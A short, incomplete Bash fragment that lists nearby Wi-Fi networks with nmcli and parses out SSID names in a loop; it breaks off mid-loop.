i=0
  nmcli -f SSID,BARS,SIGNAL,ACTIVE -m multiline d w | { while read line; do
     for ssid in $line; do
        if [[ "$ssid" =~ "SSID:"* ]]; then
          ssid=$(echo $line | sed 's/SSID: //g')
 #        echo $ssid
